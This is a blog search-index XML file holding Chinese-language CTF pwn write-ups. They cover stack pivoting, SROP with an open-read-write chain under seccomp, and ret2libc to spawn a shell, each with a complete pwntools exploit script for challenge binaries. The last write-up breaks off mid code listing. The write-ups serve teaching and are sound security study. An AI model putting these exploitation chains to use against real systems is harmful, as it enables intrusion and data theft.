<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>ret2csu</title>
    <link href="/2025/12/25/ret2csu/"/>
    <url>/2025/12/25/ret2csu/</url>
    
    <content type="html"><![CDATA[<p>别急，还没写…</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>hello pwn!</title>
    <link href="/2025/12/25/hello-pwn/"/>
    <url>/2025/12/25/hello-pwn/</url>
    
    <content type="html"><![CDATA[<p>用此博客来记录我在<code>pwn</code>学习过程中的一些题解与思考</p><p>希望你能有所收获…</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>SROP</title>
    <link href="/2025/12/25/SROP/"/>
    <url>/2025/12/25/SROP/</url>
    
    <content type="html"><![CDATA[<p>建议先看stack pivot再来这里…</p><p>ok题目来自XSWCTF2025初赛的一道<code>pwn</code>，考察了更加精妙的栈风水布局(基于stack pivot)，同时融合着SROP和ORW，来看看吧!</p><p>先看一下题目逻辑</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  undefined1 local_78 [<span class="hljs-number">108</span>];<br>  undefined4 local_c;<br>  <br>  local_c = <span class="hljs-number">0</span>;<br>  setbuf(<span class="hljs-built_in">stdin</span>,(<span class="hljs-type">char</span> *)<span class="hljs-number">0x0</span>);<br>  setbuf(<span class="hljs-built_in">stdout</span>,(<span class="hljs-type">char</span> *)<span class="hljs-number">0x0</span>);<br>  sandbox();<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;hey hey what are you doing here?&quot;</span>);<br>  FUN_004010e0(<span class="hljs-number">0</span>,local_78,<span class="hljs-number">0x50</span>);   #第一次read，没有溢出<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;I say STOP doing this!&quot;</span>);<br>  FUN_004010e0(<span class="hljs-number">0</span>,local_78,<span class="hljs-number">0x200</span>);  #第二次read，存在溢出<br>  <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>保护虽然只有<code>NX</code>，但是同时开启了<code>seccomp</code>沙箱(sandbox)，使用命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">seccomp-tools dump ./pwn<br></code></pre></td></tr></table></figure><p>查看，发现禁用了<code>execve</code>，所以只能打ORW(open,read,write)，让我们找找关于寄存器的gadget，额，竟然什么都找不到…</p><p>但是我们找到了一个<code>syscall</code>的汇编指令，所以在这种情况下，我们就要使用一招系统内核级的利用，<code>SROP</code>，linux存在一种信号处理机制，当进程收到信号时，内核会先暂停进程执行，然后保存当前寄存器状态到用户栈(sigcontext)，接下来跳转到信号处理函数，等信号处理函数执行完毕后，调用<code>sigreturn</code>系统调用，内核从栈上恢复寄存器状态，因此，我们可以伪造sigcontext结构，同时设置<code>rax</code>为<code>sigreturn</code>的系统调用号<code>15</code>(x86-64)，并执行<code>syscall</code>指令触发<code>sigreturn</code>机制，内核便会从我们伪造的<code>sigcontext</code>中恢复所有我们所设定的寄存器值，从而完全控制进程执行流!</p><p>然而还有一个关键点在于如何将rax设置为15，因为并没有<code>pop rax; ret;</code>的gadget，这时，”不难”想到，rax寄存器上保存的是函数的返回值，我们可以在read时读入15个字节长度的数据，此时rax便被巧妙地设置为了15，此时再执行syscall即可调用sigreturn机制打我们的<code>SROP</code>了</p><p>当然，为了不破坏栈的结构，我们仍然需要利用<code>stack pivot</code>迁移至bss段上伪造我们的栈帧并布局我们的利用链…</p><p>先把有用的地址列出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">read = <span class="hljs-number">0x4012a9</span>    <span class="hljs-comment">#对应执行我们的第二次read的地址</span><br>syscall = <span class="hljs-number">0x4012fa</span><br>leave_ret = <span class="hljs-number">0x4012d3</span>    <span class="hljs-comment">#栈迁移的关键</span><br>puts_got = <span class="hljs-number">0x404010</span><br>puts_plt = <span class="hljs-number">0x4010b0</span><br>bss = <span class="hljs-number">0x404090</span> + <span class="hljs-number">0x500</span>  <span class="hljs-comment">#0x404590(布局的地方)</span><br></code></pre></td></tr></table></figure><p>第一次的read直接跳过，来到我们的第二次read，首先将<code>rbp</code>迁移至bss段，并重新执行一次read(想必都会了吧)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">p.sendafter(<span class="hljs-string">b&quot;re you doing here?\n&quot;</span>,<span class="hljs-string">b&quot;beef&quot;</span>)<br><br>p.sendafter(<span class="hljs-string">b&quot;TOP doing this!\n&quot;</span>,<span class="hljs-string">b&quot;A&quot;</span> * <span class="hljs-number">0x70</span> + p64(bss) + p64(read))<br></code></pre></td></tr></table></figure><p>这时在bss段上形成了新的栈帧，我们步骤好srop的<code>sigcontext</code>以泄露libc基址，并进行第二次段内迁移</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python">p.recvuntil(<span class="hljs-string">b&quot;doing this!\n&quot;</span>)<br>payload = p64(bss + <span class="hljs-number">0x10</span>) + p64(read)   <br>payload = payload.ljust(<span class="hljs-number">0x70</span>,<span class="hljs-string">b&quot;\x00&quot;</span>)<br>payload += p64(bss - <span class="hljs-number">0x70</span>)<br>payload += p64(leave_ret)<br>payload += p64(bss+<span class="hljs-number">0x100</span>)<br>payload += p64(syscall)<br><br>frame3 = SigreturnFrame()<br>frame3.rip = puts_plt<br>frame3.rsp = bss - <span class="hljs-number">0x60</span> + <span class="hljs-number">8</span><br>frame3.rbp = bss + <span class="hljs-number">0x210</span><br>frame3.rax = <span class="hljs-number">15</span><br>frame3.rdi = puts_got<br>frame3.rsi = <span class="hljs-number">0</span><br>frame3.rdx = <span class="hljs-number">0</span><br><br>payload += <span class="hljs-built_in">bytes</span>(frame3)<br><br>p.send(payload)<br></code></pre></td></tr></table></figure><p>发送完这次payload后再次执行<code>read</code>，我们发送15字节长度的数据以将<code>rax</code>设置为15，同时注意，此时经过我们的布置，<code>rbp</code>目前在<code>0x4045a0</code>的位置，刚好新栈帧<code>rip</code>返回地址的位置便是我们的<code>syscall</code>和<code>sigcontext</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">p.sendafter(<span class="hljs-string">b&quot;TOP doing this!\n&quot;</span>,p64(bss) + <span class="hljs-string">b&quot;\xa9\x12\x40\x00\x00\x00\x00&quot;</span>)<br></code></pre></td></tr></table></figure><p>这次便会真正执行到我们的sigcontext中所设置的寄存器，即，泄露puts真实地址，从而得到libc基址，继而得到open,read,write和所需gadget的地址，而<code>rbp</code>被设置到更上方的地址再次布局我们最后的<code>ORW</code>，<code>rsp</code>设置在了我们先前<code>read</code>指令的所在地，因此，进行最后一次read，直接布置最终的rop链…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br><span class="hljs-built_in">open</span>=libc_base+libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>write=libc_base+libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>rread=libc_base+libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>rdi=libc_base+<span class="hljs-number">0x10f78b</span><br>rsi=libc_base+<span class="hljs-number">0x110a7d</span><br>rdx=<span class="hljs-number">0x4012fc</span><br>ret=libc_base+<span class="hljs-number">0x2882f</span><br>p.recvuntil(<span class="hljs-string">b&quot;doing this!\n&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x18</span>+p64(bss+<span class="hljs-number">0x10</span>)+<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x50</span>+<span class="hljs-string">b&#x27;./flag\x00\x00&#x27;</span><br>payload += p64(rdi) + p64(bss+<span class="hljs-number">0x210</span>) + p64(rsi) + p64(<span class="hljs-number">0</span>) +p64(<span class="hljs-built_in">open</span>)  <span class="hljs-comment">#bss+0x210就是flag字符串的地址!</span><br>payload += p64(rdi) + p64(<span class="hljs-number">3</span>) + p64(rsi) + p64(bss+<span class="hljs-number">0x318</span>) + p64(rdx) + p64(<span class="hljs-number">0x100</span>) + p64(bss+<span class="hljs-number">0x318</span>) + p64(rread)  <span class="hljs-comment">#3为fd,rsi随便放哪里好了...</span><br>payload += p64(rdi) + p64(<span class="hljs-number">1</span>) + p64(rsi) + p64(bss+<span class="hljs-number">0x318</span>) + p64(rdx) + p64(<span class="hljs-number">0x100</span>) + p64(bss+<span class="hljs-number">0x318</span>) + p64(write)  <span class="hljs-comment">#将flag写到stdout，注意对齐...</span><br></code></pre></td></tr></table></figure><p>最终，在精妙的布局与利用下，我们成功获得了flag…</p><p>由于迷失于错综的地址，当时我也是对着<code>gdb</code>调试了老半天才算看懂这道题的wp，写出来过程也算了却一下自己的心魔，依旧贴一张图帮助你思考…</p><p><img src="/images/5.png" alt="内存布局"></p><p>最后贴一下完整exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">40315</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br>read = <span class="hljs-number">0x4012a9</span><br>syscall = <span class="hljs-number">0x4012fa</span><br>leave_ret = <span class="hljs-number">0x4012d3</span><br>puts_got = <span class="hljs-number">0x404010</span><br>puts_plt = <span class="hljs-number">0x4010b0</span><br>bss = <span class="hljs-number">0x404090</span> + <span class="hljs-number">0x500</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(bss))<br><br>p.sendafter(<span class="hljs-string">b&quot;re you doing here?\n&quot;</span>,<span class="hljs-string">b&quot;beef&quot;</span>)<br><br>p.sendafter(<span class="hljs-string">b&quot;TOP doing this!\n&quot;</span>,<span class="hljs-string">b&quot;A&quot;</span> * <span class="hljs-number">0x70</span> + p64(bss) + p64(read))<br>p.recvuntil(<span class="hljs-string">b&quot;doing this!\n&quot;</span>)<br>payload = p64(bss + <span class="hljs-number">0x10</span>) + p64(read)<br>payload = payload.ljust(<span class="hljs-number">0x70</span>,<span class="hljs-string">b&quot;\x00&quot;</span>)<br>payload += p64(bss-<span class="hljs-number">0x70</span>)<br>payload += p64(leave_ret)<br>payload += p64(bss+<span class="hljs-number">0x100</span>)<br>payload += p64(syscall)<br><br>frame3 = SigreturnFrame()<br>frame3.rip = puts_plt<br>frame3.rsp = bss-<span class="hljs-number">0x60</span>+<span class="hljs-number">8</span><br>frame3.rbp = bss+<span class="hljs-number">0x210</span><br>frame3.rax = <span class="hljs-number">15</span><br>frame3.rdi = puts_got<br>frame3.rsi = <span class="hljs-number">0</span><br>frame3.rdx = <span class="hljs-number">0</span><br><br>payload += <span class="hljs-built_in">bytes</span>(frame3)<br><br>p.send(payload)<br><br>p.sendafter(<span class="hljs-string">b&quot;TOP doing this!\n&quot;</span>,p64(bss) + <span class="hljs-string">b&quot;\xa9\x12\x40\x00\x00\x00\x00&quot;</span>)<br><br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br><span class="hljs-built_in">open</span>=libc_base+libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>write=libc_base+libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>rread=libc_base+libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>rdi=libc_base+<span class="hljs-number">0x10f78b</span><br>rsi=libc_base+<span class="hljs-number">0x110a7d</span><br>rdx=<span class="hljs-number">0x4012fc</span><br>ret=libc_base+<span class="hljs-number">0x2882f</span><br>p.recvuntil(<span class="hljs-string">b&quot;doing this!\n&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x18</span>+p64(bss+<span class="hljs-number">0x10</span>)+<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x50</span>+<span class="hljs-string">b&#x27;./flag\x00\x00&#x27;</span><br>payload += p64(rdi) + p64(bss+<span class="hljs-number">0x210</span>) + p64(rsi) + p64(<span class="hljs-number">0</span>) +p64(<span class="hljs-built_in">open</span>)<br>payload += p64(rdi) + p64(<span class="hljs-number">3</span>) + p64(rsi) + p64(bss+<span class="hljs-number">0x318</span>) + p64(rdx) + p64(<span class="hljs-number">0x100</span>) + p64(bss+<span class="hljs-number">0x318</span>) + p64(rread)<br>payload += p64(rdi) + p64(<span class="hljs-number">1</span>) + p64(rsi) + p64(bss+<span class="hljs-number">0x318</span>) + p64(rdx) + p64(<span class="hljs-number">0x100</span>) + p64(bss+<span class="hljs-number">0x318</span>) + p64(write)<br><br>p.send(payload)<br><span class="hljs-comment">#gdb.attach(p)</span><br>p.interactive()<br><br></code></pre></td></tr></table></figure><p>就到这里便结束了，感谢阅读，生活愉快…</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>stack pivot</title>
    <link href="/2025/12/25/stack-pivot/"/>
    <url>/2025/12/25/stack-pivot/</url>
    
    <content type="html"><![CDATA[<p>题目出自哪里已经记不真切了</p><p>只依稀记得这是我正式做的第一道pwn题，当时的我就像刚出新手村的菜鸟遇见了大boss一般，与其鏖战了数个日夜才终于拿下</p><p>来看看吧!</p><p>题目逻辑非常之简单</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">undefined8 <span class="hljs-title function_">main</span><span class="hljs-params">(EVP_PKEY_CTX *param_1)</span><br>&#123;<br>  undefined1 local_58 [<span class="hljs-number">80</span>];<br>  <br>  init(param_1);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Xswlhhh!Use stack hijacking on him!&quot;</span>);<br>  read(<span class="hljs-number">0</span>,local_58,<span class="hljs-number">0x60</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>题目的保护只有<code>NX</code></p><p>但是这在当时对于只会无脑溢出覆盖返回地址的我来说宛如噩梦，设置了local_58[80]，然而read只有0x60的大小，也就是说算上<code>saved rbp</code>只剩下最后的8个字节供我覆盖rip，而题目又有<code>NX</code>，长度完全不够执行rop链!怎么办呢?我查询资料，得知存在一种技术叫做:<code>栈迁移(stack pivot)</code></p><p>原理在于，将<code>saved rbp</code>覆盖为你想让rbp去的地方，将rip覆盖为再执行一次read的地址，因此执行逻辑便变为，main函数结束后，即将退出，执行<code>leave; ret;</code>的指令，而<code>saved rbp</code>已经被设置为我们想让它去的地方(通常是一个可读可写的地址段)，rip又一次执行read，最后在那个段空间重新分配一个新的栈帧，供我们自由发挥</p><p>这里有一些前置知识需要理解，当时困扰了我许久，现在写下来，首先是<code>leave; ret;</code>干了什么，你可以将其理解为两个阶段，先是leave，其相当于<code>mov rsp,rbp</code>和<code>pop rbp</code>，注意，最后，<code>rsp += 8</code>，然后执行<code>ret</code>指令，相当于<code>rip = *rsp</code>，注意，同样，<code>rsp += 8</code>，接下来，如何理解栈帧?其实cpu并不在乎rbp在哪里，它只关心执行流要干什么事儿</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asm">LEA RAX =&gt; local_58,[RBP + -0x50]<br></code></pre></td></tr></table></figure><p>read始于local_58[80]的地址，local_58[80]这个数组始终位于<code>rbp - 0x50</code>的位置，而<code>rbp + 0x8</code>的位置便是<code>rip</code>，栈帧布局永远如此，无论rbp在哪里，因此给了我们伪造新栈帧的利用空间</p><p>所以第一段payload如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = <span class="hljs-string">b&quot;A&quot;</span> * <span class="hljs-number">0x50</span><br>payload += p64(elf.bss(<span class="hljs-number">0x800</span>))<br>payload += p64(<span class="hljs-number">0x4011e3</span>)  <span class="hljs-comment">#相当于重新执行一次read</span><br>sh.sendafter(<span class="hljs-string">b&quot;\n&quot;</span>,payload)<br></code></pre></td></tr></table></figure><p>这时一个新的栈帧在bss段中形成了</p><p>我们在新的栈帧中有了充足的空间来写rop链，因此便十分<em>easy</em>了，就打一个ret2libc吧，先来泄露libc基址</p><p>payload如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = p64(pop_rdi_ret) + p64(elf.got[<span class="hljs-string">&quot;puts&quot;</span>])<br>payload += p64(elf.plt[<span class="hljs-string">&quot;puts&quot;</span>])<br>payload += p64(elf.sym[<span class="hljs-string">&quot;main&quot;</span>])<br>payload = payload.ljust(<span class="hljs-number">0x50</span>,<span class="hljs-string">b&quot;\0&quot;</span>)<br>payload += p64(elf.bss(<span class="hljs-number">0x800</span>-<span class="hljs-number">0x58</span>))<br>payload += p64(leave_ret)<br>sh.sendafter(<span class="hljs-string">b&quot;\n&quot;</span>,payload)<br></code></pre></td></tr></table></figure><p>第一次看这个payload应该还是蛮懵的，不过对照着<code>leave; ret;</code>的含义在内存布局中多自己分析推导几遍便能理解其妙处所在，这里便不展开了</p><p>大致画一下内存布局供你分析</p><p><img src="/images/4.png" alt="内存布局"></p><p>接下来接收得到的puts真实地址并计算libc基址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">libc.address = u64(sh.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\0&quot;</span>)) - libc.sym[<span class="hljs-string">&quot;puts&quot;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;libc @&quot;</span>,<span class="hljs-built_in">hex</span>(libc.address))<br></code></pre></td></tr></table></figure><p>注意上述payload执行完后我们又回到了main函数，此时rsp经过一系列弹栈，应该位于<code>0x404810</code>的位置，而main函数起始处的指令再次布置了栈帧</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asm">push rbp<br>mov rbp,rsp<br>sub rsp,0x50<br></code></pre></td></tr></table></figure><p>这段理解起来确实比较复杂，还是那句话，多动手调试(善用你的gdb)，思考，分析<em>汇编</em>，<strong>rsp</strong>，<strong>rbp</strong>，<strong>rip</strong>，<em>内存</em>等的变化</p><p>此时在新的栈帧上，类似于上面，我们布置我们的最终payload</p><p>如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = p64(pop_rdi_ret) + p64(<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>)))<br>payload += p64(ret)  <span class="hljs-comment">#对齐!</span><br>payload += p64(libc.sym[<span class="hljs-string">&quot;system&quot;</span>])<br>payload = payload.ljust(<span class="hljs-number">0x50</span>,<span class="hljs-string">b&quot;\0&quot;</span>)<br>payload += p64(<span class="hljs-number">0x4047b0</span>)<br>payload += p64(leave_ret)<br>sh.sendafter(<span class="hljs-string">b&quot;\n&quot;</span>,payload)<br></code></pre></td></tr></table></figure><p>最后也是成功拿到shell</p><p>如果你彻底理解了这道题目，并能完整推理一遍过程，恭喜你，大抵是彻底理解了<code>stack pivot</code>这门技术，接下来迎接你的即将是更为复杂的栈布局，你加油，我也加油…</p><p>最后补一下完整exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>elf =ELF(<span class="hljs-string">&quot;./pivot&quot;</span>,<span class="hljs-literal">False</span>) <span class="hljs-comment">#本地...</span><br>libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>,<span class="hljs-literal">False</span>)<br>context.binary = elf<br>sh = elf.process()<br><br>pop_rdi_ret = <span class="hljs-number">0x401225</span><br>leave_ret = <span class="hljs-number">0x40121b</span><br>ret = leave_ret + <span class="hljs-number">1</span><br><br>payload = <span class="hljs-string">b&quot;A&quot;</span> * <span class="hljs-number">0x50</span><br>payload += p64(elf.bss(<span class="hljs-number">0x800</span>))<br>payload += p64(<span class="hljs-number">0x4011e3</span>)<br>sh.sendafter(<span class="hljs-string">b&quot;\n&quot;</span>,payload)<br><br><br>payload = p64(pop_rdi_ret) + p64(elf.got[<span class="hljs-string">&quot;puts&quot;</span>])<br>payload += p64(elf.plt[<span class="hljs-string">&quot;puts&quot;</span>])<br>payload += p64(elf.sym[<span class="hljs-string">&quot;main&quot;</span>])<br>payload = payload.ljust(<span class="hljs-number">0x50</span>,<span class="hljs-string">b&quot;\0&quot;</span>)<br>payload += p64(elf.bss(<span class="hljs-number">0x800</span>-<span class="hljs-number">0x58</span>))<br>payload += p64(leave_ret)<br>sh.sendafter(<span class="hljs-string">b&quot;\n&quot;</span>,payload)<br><br>libc.address = u64(sh.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\0&quot;</span>)) - libc.sym[<span class="hljs-string">&quot;puts&quot;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;libc @&quot;</span>,<span class="hljs-built_in">hex</span>(libc.address))<br>payload = p64(pop_rdi_ret) + p64(<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>)))<br>payload += p64(ret)<br>payload += p64(libc.sym[<span class="hljs-string">&quot;system&quot;</span>])<br>payload = payload.ljust(<span class="hljs-number">0x50</span>,<span class="hljs-string">b&quot;\0&quot;</span>)<br>payload += p64(<span class="hljs-number">0x4047b0</span>)<br>payload += p64(leave_ret)<br>sh.sendafter(<span class="hljs-string">b&quot;\n&quot;</span>,payload)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><p>感谢阅读…</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>a_strange_rop</title>
    <link href="/2025/12/25/a-strange-rop/"/>
    <url>/2025/12/25/a-strange-rop/</url>
    
    <content type="html"><![CDATA[<p>题目来自2025XSWCTF决赛的pwn题: <code>a_atrange_rop</code></p><p>题目为64为动态链接elf文件</p><p>保护为<code>NX</code>和<code>canary</code></p><p>既然题目叫a_stranre_rop</p><p>我们先看看有没有gadget</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ROPgadget --binary ./a_strange_rop | grep <span class="hljs-string">&quot;pop rdi&quot;</span><br></code></pre></td></tr></table></figure><p>找到了<code>pop rdi; ret;</code>这样的一个gadget</p><p>先观察一下题目逻辑</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">undefined8 <span class="hljs-title function_">main</span><span class="hljs-params">(EVP_PKEY_CTX *param_1)</span><br>&#123;<br>  <span class="hljs-type">int</span> iVar1;<br>  <br>  init(param_1);<br>  iVar1 = game();<br>  <span class="hljs-keyword">if</span> (iVar1 == <span class="hljs-number">1</span>) &#123;<br>    win();<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>init为初始化函数，无实际意义，忽略</p><p>我们先来看一下win函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">win</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br><br>&#123;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;good!&quot;</span>);<br>  system(<span class="hljs-string">&quot;ababalabalabalawuwuwuuwyyyyy&quot;</span>);<br>  <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到即使调用了win也不会真的<code>win</code>，但是它为我们提供了<code>call system</code>这样一个系统调用的函数</p><p>配合我们的上面找到的gadget</p><p>似乎很容易就能写出system(“&#x2F;bin&#x2F;sh”)</p><p>来看看主逻辑game部分</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 